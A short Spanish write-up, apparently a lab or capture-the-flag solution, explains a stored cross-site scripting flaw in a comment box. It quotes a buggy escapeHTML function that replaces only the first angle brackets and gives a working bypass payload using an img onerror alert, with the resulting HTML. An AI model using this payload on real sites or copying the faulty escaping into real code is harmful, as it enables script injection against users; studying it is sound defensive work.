Básicamente si posteas un comentario se inserta dentro de un p.

Y en los archivos js de la web vemos que hay una función que hace esto a los comentarios: 
```
 function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
```

Por lo que si ponemos:
```
<><img src=quefalle onerror=alert(1)>
```

Se quedaría: 
```
<p>
	"<>"
	<img src="quefalle" onerror="alert(1)">
</p>
```
